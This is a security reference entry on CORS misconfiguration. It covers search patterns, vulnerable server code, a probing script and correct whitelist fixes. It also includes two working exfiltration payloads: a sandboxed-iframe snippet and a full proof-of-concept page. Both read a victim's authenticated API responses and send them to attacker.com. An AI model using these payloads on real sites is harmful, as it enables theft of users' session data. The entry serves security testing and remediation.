# CORS Misconfiguration

**Tags:** #high #cors #cross-origin #credentials #session
**OWASP:** A05:2021 Security Misconfiguration
**CVSS Base:** 8.0 (High → reading authenticated cross-origin responses)

---

## 📖 What is it

CORS (Cross-Origin Resource Sharing) defines which origins can make requests to the API. When misconfigured — especially with `Access-Control-Allow-Credentials: true` and a dynamically reflected origin — any site can read the victim's authenticated responses.

---

## 🔍 `grep_search` Tactics

```
Access-Control-Allow-Origin
cors(
origin:
setHeader.*Access-Control
allow_origins
CORS_ORIGIN
CORS_ALLOWED_ORIGINS
req.headers.origin
request.headers['origin']
credentials: true
Access-Control-Allow-Credentials
```

---

## 💣 Critical Pattern — Reflected Origin + Credentials

```javascript
//  CRITICAL — reflects any origin + allows credentials
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);  // reflects everything
    res.setHeader('Access-Control-Allow-Credentials', 'true');         // allows cookies
    next();
});
```

**Why it is critical:** `credentials: true` instructs the browser to send session cookies in the cross-origin request. If the origin is reflected, the attacker's site can read ALL of the victim's authenticated responses.

---

## 💣 Misconfiguration Variants

### 1. Wildcard with Credentials (Invalid, but can be bypassed)

```
# Browser blocks: cannot use wildcard WITH credentials
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
# But some frameworks implement this incorrectly, leaking the origin in place of *
```

### 2. Suffix Validation Failure

```javascript
//  VULNERABLE — endsWith validation can be bypassed
const allowedOrigin = 'trusted.com';
if (req.headers.origin.endsWith(allowedOrigin)) {
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
}
// Bypass: Origin: evil-trusted.com → endsWith('trusted.com') = true!
```

### 3. `null` Origin Accepted

```
# Access from sandboxed iframes or file:// URLs
Access-Control-Allow-Origin: null

# Attacker in a sandboxed iframe can send Origin: null and gain access
```

```html
<!-- Exploit via sandboxed iframe -->
<iframe sandbox="allow-scripts allow-top-navigation-by-user-activation" 
        src="data:text/html,<script>
    fetch('https://target.com/api/user', {credentials: 'include'})
      .then(r => r.json())
      .then(d => fetch('https://attacker.com/?data=' + JSON.stringify(d)));
</script>"></iframe>
```

### 4. Regex with Bypass

```python
#  VULNERABLE — poorly constructed regex
import re
TRUSTED_ORIGINS = re.compile(r'https://.*\.trusted\.com')

if TRUSTED_ORIGINS.match(origin):
    # Bypass: https://evil.trusted.com.attacker.com
    # match() tests from the start, but does not anchor at the end without $
    set_cors_header(origin)
```

---

## 💣 Exploit PoC

```html
<!-- evil_cors.html — host at http://attacker.com -->
<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<script>
    // Target: authenticated API with CORS misconfiguration
    fetch('https://target.com/api/user/profile', {
        credentials: 'include',  // includes victim's cookies
        method: 'GET',
    })
    .then(response => response.json())
    .then(data => {
        console.log('Stolen data:', data);
        // Exfiltrate to attacker's server
        fetch('https://attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify({
                victim_data: data,
                timestamp: Date.now()
            })
        });
        
        // Display for demonstration
        document.body.innerHTML = '<h1>CORS PoC</h1><pre>' + 
            JSON.stringify(data, null, 2) + '</pre>';
    })
    .catch(err => {
        document.body.innerHTML = '<h1>BLOCKED</h1><p>CORS correctly configured</p>';
    });
</script>
</body>
</html>
```

---

## 🧪 Test Script

```python
# .tmp/validate_cors.py
import requests

TARGET = "http://target.com/api/user"
EVIL_ORIGINS = [
    "https://evil.com",
    "null",
    "https://trusted.com.evil.com",
    "https://evil-trusted.com",
    "https://subdomain.evil.com",
]

for origin in EVIL_ORIGINS:
    r = requests.get(TARGET, headers={"Origin": origin}, timeout=10)
    acao = r.headers.get("Access-Control-Allow-Origin", "(not present)")
    creds = r.headers.get("Access-Control-Allow-Credentials", "(not present)")
    
    vuln = (acao == origin or acao == "null") and creds.lower() == "true"
    
    status = "🔴 VULN" if vuln else " OK"
    print(f"{status} | Origin: {origin}")
    print(f"       ACAO: {acao} | Credentials: {creds}")
    print()
```

---

## 🛡️ Fix

```javascript
//  CORRECT — strict explicit whitelist
const ALLOWED_ORIGINS = new Set([
    'https://app.mycompany.com',
    'https://admin.mycompany.com',
]);

app.use((req, res, next) => {
    const origin = req.headers.origin;
    
    if (ALLOWED_ORIGINS.has(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
        res.setHeader('Vary', 'Origin');  //  required when reflecting origin
    }
    // If origin is not on the whitelist: set nothing → browser blocks
    next();
});
```

```python
#  CORRECT — Django CORS Headers
# settings.py
CORS_ALLOWED_ORIGINS = [
    "https://app.mycompany.com",
    "https://admin.mycompany.com",
]
CORS_ALLOW_CREDENTIALS = True
# CORS_ALLOW_ALL_ORIGINS = False  → default, do not change
```

---

## 🔗 Chain Exploits

```
Dynamic CORS + credentials: true → Full dump of authenticated session data
Accepted null CORS + sandboxed iframe → Origin bypass without detection
CORS + weak suffix validation → evil-trusted.com passes → exfiltration
CORS misconfiguration + API with PII → LGPD/GDPR cross-origin violation
Broad CORS + XSS → Exfiltrate CSRF tokens → Full CSRF bypass

### [NEW] Chain: CORS Misconfiguration → XSS
**How it works:** If an API endpoint reflects data from an authenticated cross-origin request (enabled by CORS) into a page that is vulnerable to XSS, the attacker can steal the entire session.

### [NEW] The "Vary: Origin" Problem
**How it works:** If a server reflects the `Origin` header but doesn't send `Vary: Origin`, a legitimate user's response (with their origin) might be cached by a CDN and served to everyone, leading to widespread data exposure.
```

---

## 📌 References
- [[http-security-headers]]
- [[xss-cross-site-scripting]]
- [[csrf-websocket-hijacking-cswsh]]
- [PortSwigger CORS](https://portswigger.net/web-security/cors)